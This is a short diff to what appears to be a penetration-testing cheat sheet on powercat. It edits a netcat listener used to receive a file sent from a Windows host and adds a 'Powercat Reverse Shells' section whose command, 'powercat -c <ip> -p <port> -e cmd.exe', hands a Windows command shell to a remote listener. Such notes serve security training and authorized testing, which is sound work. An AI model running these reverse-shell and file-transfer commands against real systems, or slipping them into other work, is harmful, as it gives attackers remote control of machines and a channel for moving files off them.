@@ -305,9 +305,19 @@ After script loaded:
 - Windows &rarr; Linux
   - Linux_listener
  ```bash
-  sudo nc -lnvp 443 > receiving_powercat.ps1
+  sudo nc -lnvp <port> > receiving_powercat.ps1
  ```
   - Windows_connection
   ```powershell
    powercat -c <ip> -p <port> -i <file_path>
   ```
+## Powercat Reverse Shells
+```bash 
+
+ sudo nc -lvp <port>
+```
+
+```powershell
+ powercat -c <ip> -p <port> -e cmd.exe
+```
+
